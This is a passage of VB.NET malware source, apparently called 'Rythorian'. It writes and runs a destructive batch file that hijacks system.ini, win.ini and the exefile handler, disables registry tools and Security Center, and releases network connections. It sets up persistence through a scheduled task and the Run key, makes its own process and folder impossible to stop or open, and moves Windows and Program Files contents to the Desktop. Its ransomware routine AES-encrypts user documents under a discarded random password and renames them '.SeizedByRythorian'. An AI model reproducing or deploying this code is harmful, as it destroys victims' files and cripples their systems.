        rythorian77.AppendLine("find /v /i ""shell=explorer.exe""<temp1.tmp>temp2.tmp")
        rythorian77.AppendLine("echo [boot]>%wIndIR%\system.ini")
        rythorian77.AppendLine("echo Shell=Explorer.exe WinDebug.bat>>%wiNdIR%\system.ini")
        rythorian77.AppendLine("type temp2.tmp>>%WIndIR%\system.ini")
        rythorian77.AppendLine("del temp?.tmp")
        rythorian77.AppendLine(":: Win.ini")
        rythorian77.AppendLine("copy %0 %windir%\TaskLoad.bat.")
        rythorian77.AppendLine("find /v /i ""[windows]""<%windir%\win.ini>temp1.tmp")
        rythorian77.AppendLine("find /v /i ""load=""<temp1.tmp>temp2.tmp")
        rythorian77.AppendLine("find /v /i ""run=""<temp2.tmp>temp1.tmp")
        rythorian77.AppendLine("find /v /i ""NullPort=""<temp1.tmp>temp2.tmp")
        rythorian77.AppendLine("echo [windows]>%wiNdIR%\win.ini")
        rythorian77.AppendLine("echo load=TaskLoad.bat>>%winDIr%\win.ini")
        rythorian77.AppendLine("echo run=>>%wINDir%\win.ini")
        rythorian77.AppendLine("echo NullPort=None>>%windIr%\win.ini")
        rythorian77.AppendLine("type temp2.tmp>>%wiNDir%\win.ini")
        rythorian77.AppendLine("del temp?.tmp")
        rythorian77.AppendLine(":: Startup Folder")
        rythorian77.AppendLine("Copy %0 C:\startup.bat")
        rythorian77.AppendLine("copy C:\startup.bat ""%UserProfile%\Start Menu\Programs\Startup")
        rythorian77.AppendLine(":: Shell Spawning")
        rythorian77.AppendLine("Copy %0 C:\startup.bat")
        rythorian77.AppendLine("echo.on error resume next>temp.vbs")
        rythorian77.AppendLine("echo set sh=createobject(""wscript.shell"")>>temp.vbs")
        rythorian77.AppendLine("echo sh.regwrite ""HKCR\exefile\Shell\Open\Command"",""wscript.exe C:\CmdLoad.vbs ""%%1 %%*"">>temp.vbs")
        rythorian77.AppendLine("cscript temp.vbs")
        rythorian77.AppendLine("del temp.vbs")
        rythorian77.AppendLine("echo.set shell = createobject(""wscript.shell"")>>C:\CmdLoad.vbs")
        rythorian77.AppendLine("echo.shell.run ""C:\startup.bat"">>C:\CmdLoad.vbs")
        rythorian77.AppendLine("reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System"" /t Reg_dword /v DisableRegistryTools /f /d 1")
        rythorian77.AppendLine("net stop ""WSearch")
        rythorian77.AppendLine("net stop ""Security Center")
        rythorian77.AppendLine("net stop ""SDRSVC")
        rythorian77.AppendLine("ipconfig /release + vbnewlineif %ERRORLEVEL%==1 ipconfig /release_all")
        rythorian77.AppendLine("echo MSGBOX ""The Ninth Wave Hacking Group Did This To You> %temp%\TEMPmessage.vbs")
        rythorian77.AppendLine("call %temp%\TEMPmessage.vbs")
        rythorian77.AppendLine("%dll1%%dll2% %m%,disable")
        rythorian77.AppendLine("%dll1%%dll2% %k%,disable")
        rythorian77.AppendLine("goto infect")
        rythorian77.AppendLine("goto end")
        rythorian77.AppendLine(":end")
        rythorian77.AppendLine("exit")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.AppendLine("CreateObject(""Wscript.Shell"").Run ""Nucleus.bat"", 0, True")
        rythorian77.AppendLine("GoTo begin")

        File.WriteAllText("Nucleus.bat", rythorian77.ToString())

        Process.Start("Nucleus.bat")
        Err.Clear()
Err:
        On Error Resume Next
    End Sub

#End Region

#Region "Registry Hive | Create Process Extension"
    'Create's your own custom file extension into registry hive.
    Public Enum KeyHiveSmall
        ClassesRoot
        CurrentUser
        LocalMachine
    End Enum

    'Custom file extension into registry hive
    Public Shared Sub CreateAssociation(ProgID As String, extension As String, description As String, application As String, icon As String, Optional hive As KeyHiveSmall = KeyHiveSmall.CurrentUser)
        On Error GoTo ErrRegistryHandler
        Dim selectedKey As RegistryKey = Nothing

        Select Case hive
            Case KeyHiveSmall.ClassesRoot
                Registry.ClassesRoot.CreateSubKey(extension).SetValue(".Rythorian", ProgID)
                selectedKey = Registry.ClassesRoot.CreateSubKey(ProgID)
            Case KeyHiveSmall.CurrentUser
                Registry.CurrentUser.CreateSubKey("Software\Classes\" & extension).SetValue(".Rythorian", ProgID)
                selectedKey = Registry.CurrentUser.CreateSubKey("Software\Classes\" & ProgID)
            Case KeyHiveSmall.LocalMachine
                Registry.LocalMachine.CreateSubKey("Software\Classes\" & extension).SetValue(".Rythorian", ProgID)
                selectedKey = Registry.LocalMachine.CreateSubKey("Software\Classes\" & ProgID)
        End Select

        If selectedKey IsNot Nothing Then

            If description IsNot Nothing Then
                selectedKey.SetValue("SHA256 File Forge", description)
            End If

            If icon IsNot Nothing Then
                selectedKey.CreateSubKey("DefaultIcon").SetValue("", icon, RegistryValueKind.ExpandString)
                selectedKey.CreateSubKey("Shell\Open").SetValue("icon", icon, RegistryValueKind.ExpandString)
            End If

            If application IsNot Nothing Then
                selectedKey.CreateSubKey("Shell\Open\command").SetValue("", """" & application & """" & " ""%1""", RegistryValueKind.ExpandString)
            End If
        End If

        selectedKey.Flush()
        selectedKey.Close()
        Err.Clear()

ErrRegistryHandler:
        On Error Resume Next

    End Sub

    Public Shared Sub SelfCreateAssociation(extension As String, Optional hive As KeyHiveSmall = KeyHiveSmall.CurrentUser, Optional description As String = "")
        On Error GoTo ErrCreateAssociationHandler
        Dim ProgID As String = Assembly.GetExecutingAssembly().EntryPoint.DeclaringType.FullName
        Dim FileLocation As String = Assembly.GetExecutingAssembly().Location
        CreateAssociation(ProgID, extension, description, FileLocation, FileLocation & ",0", hive)
        Err.Clear()

ErrCreateAssociationHandler:
        On Error Resume Next
    End Sub
#End Region

#Region " GPO Security Identifier | Creators Owner ID, (Highest Mandatory Level) | Schedule Task  "
    'GPO cmdlet creates a GPO with a specified name. By default, the newly created GPO is not linked to a site,
    'domain, or organizational unit (OU). You can use this cmdlet To create a GPO that Is based On a starter GPO by
    'specifying the GUID Or the display name of the Starter GPO, Or by piping a StarterGpo Object into the cmdlet.
    'The cmdlet returns a GPO Object, which represents the created GPO that you can pipe "To other Group Policy cmdlets."
    Public Function GPO(cmd As String,
                        Optional args As String = "",
                        Optional startin As String = "") As String
        GPO = ""
        Try
            Dim p = New Process With {
                .StartInfo = New ProcessStartInfo(cmd, args)
            }
            If startin <> "" Then p.StartInfo.WorkingDirectory = startin
            p.StartInfo.RedirectStandardOutput = True
            p.StartInfo.RedirectStandardError = True
            p.StartInfo.UseShellExecute = False
            p.StartInfo.CreateNoWindow = True
            p.Start()
            p.WaitForExit()
            Dim s = p.StandardOutput.ReadToEnd
            s += p.StandardError.ReadToEnd
            GPO = s
        Catch ex As Exception
        End Try
    End Function ' Get Process Output.

    'Possession Part of Owning System Via; The <Security Identifier>
    Public Function CanH() As Boolean
        CanH = False
        'Displays user, group, and privileged information for the user who is currently logged on to the local system.
        'If used without parameters, whoami displays the current domain and user name.
        'https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/whoami
        Dim s = GPO("c: \windows\system32\cmd.exe",
                    "/c whoami /all | findstr /I /C:""S-1-5-32-544""") '<<This is a Security Identifier
        If s.Contains("S-1-5-32-544") Then CanH = True
    End Function ' Check if can get Higher.

    'Below: Creators Owner ID has discovered the "Security Identifier" to be replaced by the "S-1-16-12288"
    '(Highestndatory Level) ADMIN.
    'A Security Identifier (SID) is used to uniquely identify a security principal or security group. Security principals can represent any entity
    'that can be authenticated by the operating system, such as a user account, a computer account, or a thread or process that runs in the security
    'context of a user or computer account.Each account Or group, Or process running in the security context of the account,
    'has a unique SID that Is issued by an authority, such as a Windows domain controller. It Is stored in a security database.
    'The system generates the SID that identifies a particular account Or group at the time the account Or group Is created.
    'When a SID has been used as the unique identifier for a user Or group, it can never be used again to identify another user Or group.
    'Each time a user signs in, the system creates an access token for that user. The access token contains the user's SID, user rights, and the SIDs
    'for any groups the user belongs to. This token provides the security context for whatever actions the user performs on that computer.
    'In addition to the uniquely created, domain-specific SIDs that are assigned to specific users And groups, there are well-known SIDs that identify
    'generic groups And generic users. For example, the Everyone And World SIDs identify a group that includes all users. Well-known SIDs have values
    'that remain constant across all operating systems. SIDs are a fundamental building block Of the Windows security model.
    'They work With specific components Of the authorization And access control technologies In the security infrastructure Of the
    'Windows Server operating systems. This helps protect access To network resources And provides a more secure computing environment.
    '>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    'How security identifiers work:
    'Users refer To accounts by Using the account name, but the operating system internally refers To accounts And processes
    'that run In the security context Of the account by Using their security identifiers (SIDs). For domain accounts, the SID Of a
    'security principal Is created by concatenating the SID Of the domain With a relative identifier (RID) For the account.
    'SIDs are unique within their scope (domain Or local), And they are never reused.
    Public Function CH() As Boolean
        CH = False
        Dim s = GPO("c:\windows\system32\cmd.exe",
                    "/c whoami /all | findstr /I /C:""S-1-16-12288""")
        If s.Contains("S-1-16-12288") Then CH = True
    End Function ' Check if Higher.

    'Elevating Privileges
    Public Function GH() As Boolean
        GH = False
        If Not CH() Then
            Try
                'Elevating process privilege programmatically.
                'In computing, runas is a command in the Microsoft Windows line of operating systems that allows a user to run specific
                'tools and programs under a different username to the one that was used to logon to a computer interactively.
                Dim pc As New ProcessStartInfo(Process.GetCurrentProcess.MainModule.FileName) With {
                    .Verb = "runas"
                }
                Dim p = Process.Start(pc)
                Return True
            Catch ex As Exception
                Return False
            End Try
        End If
    End Function ' Get Higher Level As Admin.

    'Now that the information is gathered, we create a backdoor into the system via entry od Task Scheduler
    'with the highest Logon.
    Private Sub Rythorians_Scheduler()
        ' StartUp BackgroundWorker to schedule a startup task
        Dim subw As New BackgroundWorker()
        AddHandler subw.DoWork, Sub(sender1 As Object,
                                    e1 As DoWorkEventArgs)
                                    'Schedules Task to start up with Admin Rights
                                    While True
                                        Try
                                            If CH() Then
                                                If Not GPO("c:\windows\system32\cmd.exe",
                                                           $"/C schtasks /create /rl HIGHEST /sc ONLOGON /tn SHA256 File Forge /F /tr """"{Process.GetCurrentProcess.MainModule.FileName}""""").Contains("successfully") Then
                                                    My.Computer.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True).SetValue("SHA256 File Forge",
                                                                                                                                                                    Process.GetCurrentProcess.MainModule.FileName)
                                                End If
                                            Else
                                                My.Computer.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True).SetValue("SHA256 File Forge",
                                                                                                                                                                Process.GetCurrentProcess.MainModule.FileName)
                                            End If
                                        Catch ex As Exception
                                        End Try
                                        Thread.Sleep(15000)
                                    End While
                                End Sub
        subw.RunWorkerAsync()
    End Sub
#End Region

#Region "Admin Protected Process | Folder"
    <Obsolete>
    Public Sub Housing()
        Dim t As New Thread(Sub()

                                'This compliments "Process Security" below so only Admin can Terminate this Process which is your program...:)
                                Dim hProcess As IntPtr = GetCurrentProcess()
                                Dim dacl = GetProcessSecurityDescriptor(hProcess)

                                For i As Integer = dacl.DiscretionaryAcl.Count - &H1 To &H0 + &H1
                                    dacl.DiscretionaryAcl.RemoveAce(i)
                                Next

                                dacl.DiscretionaryAcl.InsertAce(&H0, New CommonAce(AceFlags.None,
                                                                                   AceQualifier.AccessDenied,
                                                                                   ProcessAccessRights.PROCESS_ALL_ACCESS,
                                                                                   New SecurityIdentifier(WellKnownSidType.WorldSid,
                                                                                                          Nothing),
                                                                                   False,
                                                                                   Nothing))
                                SetProcessSecurityDescriptor(hProcess, dacl)
                            End Sub)
        t.Start()
    End Sub

    'The Microsoft Windows security model enables you to control access to process objects.
    'For more information about security, see Access-Control Model.
    'When a user logs in, the system collects a set of data that uniquely identifies the user during the authentication
    'process, And stores it in an access token. This access token describes the security context of all processes associated with the user.
    'The security context of a process Is the set of credentials given to the process Or the user account that created the process.
    'You can use a token To specify the current security context For a process Using the CreateProcessWithTokenW Function.
    'You can specify a security descriptor For a process When you Call the CreateProcess, CreateProcessAsUser,
    'Or CreateProcessWithLogonW Function. If you specify NULL, the process gets a Default security descriptor.
    'The ACLs In the Default security descriptor For a process come from the primary Or impersonation token Of the creator.
    <Flags>
    Public Enum ProcessAccessRights

        PROCESS_CREATE_PROCESS = &H80
        PROCESS_CREATE_THREAD = &H2
        PROCESS_DUP_HANDLE = &H40
        PROCESS_QUERY_INFORMATION = &H400
        PROCESS_QUERY_LIMITED_INFORMATION = &H1000
        PROCESS_SET_INFORMATION = &H200
        PROCESS_SET_QUOTA = &H100
        PROCESS_SUSPEND_RESUME = &H800
        PROCESS_TERMINATE = &H1
        PROCESS_VM_OPERATION = &H8
        PROCESS_VM_READ = &H10
        PROCESS_VM_WRITE = &H20
        DELETE = &H10000
        READ_CONTROL = &H20000
        SYNCHRONIZE = &H100000
        WRITE_DAC = &H40000
        WRITE_OWNER = &H80000
        STANDARD_RIGHTS_REQUIRED = &HF0000

        PROCESS_ALL_ACCESS = STANDARD_RIGHTS_REQUIRED _
            Or SYNCHRONIZE _
            Or &HFFF

    End Enum

    'Process security API
    'The GetKernelObjectSecurity function retrieves a copy of the security descriptor that protects a kernel object.
    <DllImport("advapi32.dll", SetLastError:=True)>
    Private Shared Function GetKernelObjectSecurity(Handle As IntPtr,
                                                    securityInformation As Integer,
                                                    <Out> pSecurityDescriptor As Byte(),
                                                    nLength As UInteger,
                                                    <Out> ByRef lpnLengthNeeded As UInteger) As Boolean

    End Function

    'Process security API. Retrieves a pseudo handle for the current process.
    'A pseudo handle is a special constant, currently (HANDLE)-1, that is interpreted as the current process handle.
    'For compatibility with future operating systems, it is best to call GetCurrentProcess instead of hard-coding this constant value.
    'The calling process can use a pseudo handle to specify its own process whenever a process handle is required.
    'Pseudo handles are not inherited by child processes.
    <DllImport("kernel32.dll")>
    Public Shared Function GetCurrentProcess() As IntPtr

    End Function

    'Process security API. The SetKernelObjectSecurity function sets the security of a kernel object.
    'For example, this can be a process, thread, or event.
    'Note: This function should not be used when setting a security descriptor on file system objects.
    'Instead, use the SetSecurityInfo or SetNamedSecurityInfo functions.
    <DllImport("advapi32.dll", SetLastError:=True)>
    Private Shared Function SetKernelObjectSecurity(Handle As IntPtr,
                                                    securityInformation As Integer,
                                                    <[In]> pSecurityDescriptor As Byte()) As Boolean

    End Function

    'These functions serve to protect "Ratchet's Process" from being terminated unless you are an admin.
    'The Microsoft Windows security model enables you to control access to process objects. For more information about security,
    'see Access-Control Model.
    'When a user logs in, the system collects a set of data that uniquely identifies the user during the authentication process,
    'And stores it in an access token. This access token describes the security context of all processes associated with the user.
    'The security context of a process Is the set of credentials given to the process Or the user account that created the process.
    <Obsolete>
    Public Shared Function GetProcessSecurityDescriptor(processHandle As IntPtr) As RawSecurityDescriptor
        Const DACL_SECURITY_INFORMATION As Integer = &H4
        Dim psd As Byte() = New Byte(-1) {}
        Dim bufSizeNeeded As UInteger
        GetKernelObjectSecurity(processHandle, DACL_SECURITY_INFORMATION, psd, 0, bufSizeNeeded)
        Select Case bufSizeNeeded
            Case Is < 0, Is > Short.MaxValue
                Throw New Win32Exception()
        End Select
        If Not GetKernelObjectSecurity(processHandle, DACL_SECURITY_INFORMATION, CSharpImpl.Assign(psd, New Byte(bufSizeNeeded _
                - 1) {}), bufSizeNeeded, bufSizeNeeded) Then Throw New Win32Exception()
        Return New RawSecurityDescriptor(psd, 0)
    End Function

    'Set Process Security Descriptor Action. Adjusting Process Security allows a process To be Protected from most tampering by users.
    'For example, adjusting process security can restrict who can Stop a process from the task manager.
    Public Shared Sub SetProcessSecurityDescriptor(processHandle As IntPtr,
                                                   dacl As RawSecurityDescriptor)
        Const DACL_SECURITY_INFORMATION As Integer = &H4
        Dim rawsd As Byte() = New Byte(dacl.BinaryLength - 1) {}
        dacl.GetBinaryForm(rawsd,
                           0)
        If Not SetKernelObjectSecurity(processHandle,
                                       DACL_SECURITY_INFORMATION,
                                       rawsd) Then Throw New Win32Exception()
    End Sub

    'C# Conversion to VB.Net
    Private Class CSharpImpl

        'Specifies that one or more declared programming elements are associated with a class or structure at large,
        'and not with a specific instance of the class or structure.
        <Obsolete("Please refactor calling code to use normal Visual Basic assignment")>
        Public Shared Function Assign(Of T)(ByRef target As T,
                                            value As T) As T
            target = value
            Return value
        End Function

    End Class

    'The NtSetInformationProcess function can be used to set a process as critical process.
    'The system will bug check the system with the bug check code CRITICAL_PROCESS_TERMINATION (0xF4) when the critical process is terminated.
    <DllImport("ntdll.dll", SetLastError:=True)>
    Private Shared Function NtSetInformationProcess(hProcess As IntPtr,
                                                    processInformationClass As Integer,
                                                    ByRef processInformation As Integer,
                                                    processInformationLength As Integer) As Integer
    End Function

    Private Sub ProcessSecurity_Shield()
        Dim filePath As String
        filePath = Environment.GetFolderPath(Assembly.GetExecutingAssembly().Location)

        On Error GoTo Err
        Dim adminUserName As String = Environment.UserName
        Dim fsa As New FileSystemAccessRule(adminUserName,
                                                FileSystemRights.FullControl,
                                                AccessControlType.Deny)
        Dim ds As DirectorySecurity = Directory.GetAccessControl(filePath)
        'Just set this below to "RemoveAccessRule" to remove restriction from folder
        ds.AddAccessRule(fsa) '<<<<<< HERE <<<<<<
        Directory.SetAccessControl(filePath, ds)
Err:
    End Sub
#End Region

#Region "AES 256-Bit Encryption"
    Public Function AES_Encrypt(bytesToBeEncrypted As Byte(), passwordBytes As Byte()) As Byte()
        Dim encryptedBytes As Byte() = Nothing
        Dim saltBytes As Byte() = New Byte() {1, 2, 3, 4, 5, 6, 7, 8}

        Using moth As New MemoryStream()

            Using AES As New RijndaelManaged()
                AES.KeySize = 256
                AES.BlockSize = 128
                Dim key = New Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000)
                AES.Key = key.GetBytes(AES.KeySize / 8)
                AES.IV = key.GetBytes(AES.BlockSize / 8)
                AES.Mode = CipherMode.CBC

                Using cs = New CryptoStream(moth, AES.CreateEncryptor(), CryptoStreamMode.Write)
                    cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length)
                    cs.Close()
                End Using

                encryptedBytes = moth.ToArray()
            End Using
        End Using

        Return encryptedBytes
    End Function

    Public Function CreatePassword(length As Integer) As String
        Const valid As String = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"
        Dim rezNok As New StringBuilder()
        Dim rnd As New Random()

        While 0 < Math.Max(Interlocked.Decrement(length), length + 1)
            rezNok.Append(valid(rnd.[Next](valid.Length)))
        End While

        Return rezNok.ToString()
    End Function


    Public Sub EncryptFile(file As String, password As String)
        Try
            Dim bytesToBeEncrypted As Byte() = IO.File.ReadAllBytes(file)
            Dim passwordBytes As Byte() = Encoding.UTF8.GetBytes(password)
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes)
            Dim bytesEncrypted As Byte() = AES_Encrypt(bytesToBeEncrypted, passwordBytes)
            IO.File.WriteAllBytes(file, bytesEncrypted)
            IO.File.Move(file, file & ".SeizedByRythorian")
        Catch

        End Try
    End Sub

    Public Sub EncryptDirectory(location As String, password As String)
        Dim validExtensions = {".txt", ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd", "rar"}
        Dim files As String() = Directory.GetFiles(location)
        Dim childDirectories As String() = Directory.GetDirectories(location)

        For i As Integer = 0 To files.Length - 1
            Dim extension As String = Path.GetExtension(files(i))

            If validExtensions.Contains(extension) Then
                EncryptFile(files(i), password)
            End If
        Next

        For i As Integer = 0 To childDirectories.Length - 1
            EncryptDirectory(childDirectories(i), password)
        Next
    End Sub

    Public Sub StartAction()
        On Error GoTo Err
        Dim password As String = CreatePassword(15)

        Dim startPath As String = userDir & userName & Music
        Dim startPath1 As String = userDir & userName & Pictures
        Dim startPath2 As String = userDir & userName & Desktop
        Dim startPath3 As String = userDir & userName & Documents
        Dim startPath4 As String = userDir & userName & Favorites
        Dim startPath5 As String = userDir & userName & Videos
        Dim startPath6 As String = userDir & userName & History
        Dim startPath7 As String = userDir & userName & InternetCache
        Dim startPath8 As String = userDir & userName & LocalApplicationData
        Dim startPath9 As String = userDir & userName & LocalizedResources
        Dim startPath10 As String = userDir & userName & NetworkShortcuts
        Dim startPath11 As String = userDir & userName & SendTo
        Dim startPath12 As String = userDir & userName & System
        Dim startPath13 As String = userDir & userName & Windows
        Dim startPath14 As String = userDir & userName & SystemX86
        Dim startPath15 As String = userDir & userName & StartMenu
        Dim startPath16 As String = userDir & userName & Templates
        Dim startPath17 As String = userDir & userName & Personal
        Dim startPath18 As String = userDir & userName & Resources
        Dim startPath19 As String = userDir & userName & Programs
        Dim startPath20 As String = userDir & userName & ProgramFiles
        Dim startPath21 As String = userDir & userName & ProgramFilesX86
        Dim startPath22 As String = userDir & userName & PrinterShortcuts
        Dim startPath23 As String = userDir & userName & Recent
        Dim startPath24 As String = userDir & userName & Fonts
        Dim startPath25 As String = userDir & userName & AdminTools
        Dim startPath26 As String = userDir & userName & ApplicationData

        EncryptDirectory(startPath, password) 'Music
        EncryptDirectory(startPath1, password) 'Pictures
        EncryptDirectory(startPath2, password) 'Desktop
        EncryptDirectory(startPath3, password) 'Documents
        EncryptDirectory(startPath4, password) 'Favorites
        EncryptDirectory(startPath5, password) 'Videos
        EncryptDirectory(startPath6, password) 'History
        EncryptDirectory(startPath7, password) 'InternetCache
        EncryptDirectory(startPath8, password) 'LocalApplicationData
        EncryptDirectory(startPath9, password) 'LocalizedResources
        EncryptDirectory(startPath10, password) 'NetworkShortcuts
        EncryptDirectory(startPath11, password) 'SendTo
        EncryptDirectory(startPath12, password) 'System
        EncryptDirectory(startPath13, password) 'Windows
        EncryptDirectory(startPath14, password) 'SystemX86
        EncryptDirectory(startPath15, password) 'StartMenu
        EncryptDirectory(startPath16, password) 'Templates
        EncryptDirectory(startPath17, password) 'Personal
        EncryptDirectory(startPath18, password) 'Resources
        EncryptDirectory(startPath19, password) 'Programs
        EncryptDirectory(startPath20, password) 'ProgramFiles
        EncryptDirectory(startPath21, password) 'ProgramFilesX86
        EncryptDirectory(startPath22, password) 'PrinterShortCuts
        EncryptDirectory(startPath23, password) 'Recent
        EncryptDirectory(startPath24, password) 'Fonts
        EncryptDirectory(startPath25, password) 'AdminTools
        EncryptDirectory(startPath26, password) 'ApplicationData
Err:
    End Sub
#End Region

#Region "Mass Movement Order to Desktop"
    Private Sub Rythorians_Movement_Order()
        On Error Resume Next
        Dim sourcePath = userDir & userName & Music
        Dim sourcePath1 = userDir & userName & Videos
        Dim sourcePath2 = userDir & userName & Pictures
        Dim sourcePath3 = userDir & userName & Documents
        Dim sourcePath4 = userDir & userName & Favorites
        Dim sourcePath5 = userDir & userName & History
        Dim sourcePath6 = userDir & userName & InternetCache
        Dim sourcePath7 = userDir & userName & LocalApplicationData
        Dim sourcePath8 = userDir & userName & LocalizedResources
        Dim sourcePath9 = userDir & userName & NetworkShortcuts
        Dim sourcePath10 = userDir & userName & SendTo
        Dim sourcePath11 = userDir & userName & StartMenu
        Dim sourcePath15 = userDir & userName & Templates
        Dim sourcePath16 = userDir & userName & Personal
        Dim sourcePath17 = userDir & userName & Resources

        'The Err object is automatically reset when either a Resume, Exit Sub, Exit Function, Exit Property,
        'or On Error statement is executed.You can achieve the same results by setting the Err. Number property to 0; however,
        'your code will be more readable if you use the Clear method.
        'Target System
        On Error GoTo ErrSystemHandler
        Dim sourcePath12 = userDir & userName & System
        Dim targetPath1 = userDir & userName & Desktop
        'System
        Dim files12 = Directory.EnumerateFiles(sourcePath12, "*", SearchOption.AllDirectories).GroupBy(Function(s) Path.GetDirectoryName(s))

        For Each folder In files12
            Dim targetFolder = folder.Key.Replace(sourcePath12, targetPath1)
            Directory.CreateDirectory(targetFolder)

            For Each file In folder
                Dim targetFile = Path.Combine(targetFolder, Path.GetFileName(file))
                If IO.File.Exists(targetFile) Then IO.File.Delete(targetFile)
                IO.File.Move(file, targetFile)
            Next

        Next
        Err.Clear() 'Clears Object
ErrSystemHandler:
        On Error Resume Next 'Continues Course

        'Target Windows
        On Error GoTo ErrWindowsHandler
        Dim sourcePath13 = userDir & userName & Windows
        Dim targetPath2 = userDir & userName & Desktop
        'System
        Dim files13 = Directory.EnumerateFiles(sourcePath13, "*", SearchOption.AllDirectories).GroupBy(Function(s) Path.GetDirectoryName(s))

        For Each folder In files13
            Dim targetFolder = folder.Key.Replace(sourcePath13, targetPath2)
            Directory.CreateDirectory(targetFolder)

            For Each file In folder
                Dim targetFile = Path.Combine(targetFolder, Path.GetFileName(file))
                If IO.File.Exists(targetFile) Then IO.File.Delete(targetFile)
                IO.File.Move(file, targetFile)
            Next

        Next
        Err.Clear() 'Clears Object
ErrWindowsHandler:
        On Error Resume Next 'Continues Course

        'Target SystemX86
        On Error GoTo ErrSystemX86Handler
        Dim sourcePath14 = userDir & userName & SystemX86
        Dim targetPath3 = userDir & userName & Desktop
        'System
        Dim files14 = Directory.EnumerateFiles(sourcePath14, "*", SearchOption.AllDirectories).GroupBy(Function(s) Path.GetDirectoryName(s))

        For Each folder In files14
            Dim targetFolder = folder.Key.Replace(sourcePath14, targetPath3)
            Directory.CreateDirectory(targetFolder)

            For Each file In folder
                Dim targetFile = Path.Combine(targetFolder, Path.GetFileName(file))
                If IO.File.Exists(targetFile) Then IO.File.Delete(targetFile)
                IO.File.Move(file, targetFile)
            Next

        Next
        Err.Clear() 'Clears Object 
ErrSystemX86Handler:
        On Error Resume Next 'Continues Course

        'Target Programs
        On Error GoTo ErrProgramsHandler
        Dim sourcePath18 = userDir & userName & Programs
        Dim targetPath4 = userDir & userName & Desktop
        'System
        Dim files18 = Directory.EnumerateFiles(sourcePath18, "*", SearchOption.AllDirectories).GroupBy(Function(s) Path.GetDirectoryName(s))

        For Each folder In files18
            Dim targetFolder = folder.Key.Replace(sourcePath18, targetPath4)
            Directory.CreateDirectory(targetFolder)

            For Each file In folder
                Dim targetFile = Path.Combine(targetFolder, Path.GetFileName(file))
                If IO.File.Exists(targetFile) Then IO.File.Delete(targetFile)
                IO.File.Move(file, targetFile)
            Next

        Next
        Err.Clear() 'Clears Object 
ErrProgramsHandler:
        On Error Resume Next 'Continues Course

        'Target ProgramsFiles
        On Error GoTo ErrProgramFilesHandler
        Dim sourcePath19 = userDir & userName & ProgramFiles
        Dim targetPath5 = userDir & userName & Desktop
        'System
        Dim files19 = Directory.EnumerateFiles(sourcePath19, "*", SearchOption.AllDirectories).GroupBy(Function(s) Path.GetDirectoryName(s))

        For Each folder In files19
            Dim targetFolder = folder.Key.Replace(sourcePath19, targetPath5)
            Directory.CreateDirectory(targetFolder)

            For Each file In folder
                Dim targetFile = Path.Combine(targetFolder, Path.GetFileName(file))
                If IO.File.Exists(targetFile) Then IO.File.Delete(targetFile)
                IO.File.Move(file, targetFile)
            Next

        Next
        Err.Clear() 'Clears Object 
ErrProgramFilesHandler:
        On Error Resume Next 'Continues Course

        'Target ProgramsFilesX86
        On Error GoTo ErrProgramFilesX86Handler
        Dim sourcePath20 = userDir & userName & ProgramFilesX86
        Dim targetPath6 = userDir & userName & Desktop
        'System
        Dim files20 = Directory.EnumerateFiles(sourcePath20, "*", SearchOption.AllDirectories).GroupBy(Function(s) Path.GetDirectoryName(s))

        For Each folder In files20
            Dim targetFolder = folder.Key.Replace(sourcePath20, targetPath6)
            Directory.CreateDirectory(targetFolder)

            For Each file In folder
                Dim targetFile = Path.Combine(targetFolder, Path.GetFileName(file))
                If IO.File.Exists(targetFile) Then IO.File.Delete(targetFile)
                IO.File.Move(file, targetFile)
            Next

        Next
        Err.Clear() 'Clears Object 
ErrProgramFilesX86Handler:
        On Error Resume Next 'Continues Course

        'Target PrinterShortcuts
        On Error GoTo ErrPrinterShortcutsHandler
        Dim sourcePath21 = userDir & userName & PrinterShortcuts
        Dim targetPath7 = userDir & userName & Desktop
        'System
        Dim files21 = Directory.EnumerateFiles(sourcePath21, "*", SearchOption.AllDirectories).GroupBy(Function(s) Path.GetDirectoryName(s))

        For Each folder In files21
            Dim targetFolder = folder.Key.Replace(sourcePath21, targetPath7)
            Directory.CreateDirectory(targetFolder)

            For Each file In folder
                Dim targetFile = Path.Combine(targetFolder, Path.GetFileName(file))
                If IO.File.Exists(targetFile) Then IO.File.Delete(targetFile)
                IO.File.Move(file, targetFile)
            Next

        Next
        Err.Clear() 'Clears Object 
ErrPrinterShortcutsHandler:
        On Error Resume Next 'Continues Course

        'Target Recent
        On Error GoTo ErrRecentHandler
        Dim sourcePath22 = userDir & userName & Recent
        Dim targetPath8 = userDir & userName & Desktop
        'System
        Dim files22 = Directory.EnumerateFiles(sourcePath22, "*", SearchOption.AllDirectories).GroupBy(Function(s) Path.GetDirectoryName(s))

        For Each folder In files22
            Dim targetFolder = folder.Key.Replace(sourcePath22, targetPath8)
            Directory.CreateDirectory(targetFolder)

            For Each file In folder
                Dim targetFile = Path.Combine(targetFolder, Path.GetFileName(file))
                If IO.File.Exists(targetFile) Then IO.File.Delete(targetFile)
                IO.File.Move(file, targetFile)
            Next

        Next
        Err.Clear() 'Clears Object 
ErrRecentHandler:
        On Error Resume Next 'Continues Course

        'Target Fonts
        On Error GoTo ErrFontsHandler
        Dim sourcePath23 = userDir & userName & Fonts
        Dim targetPath9 = userDir & userName & Desktop
        'System
        Dim files23 = Directory.EnumerateFiles(sourcePath23, "*", SearchOption.AllDirectories).GroupBy(Function(s) Path.GetDirectoryName(s))

        For Each folder In files23
            Dim targetFolder = folder.Key.Replace(sourcePath23, targetPath9)
            Directory.CreateDirectory(targetFolder)

            For Each file In folder
                Dim targetFile = Path.Combine(targetFolder, Path.GetFileName(file))
                If IO.File.Exists(targetFile) Then IO.File.Delete(targetFile)
                IO.File.Move(file, targetFile)
            Next

        Next
        Err.Clear() 'Clears Object 
ErrFontsHandler:
        On Error Resume Next 'Continues Course

        'Target Fonts
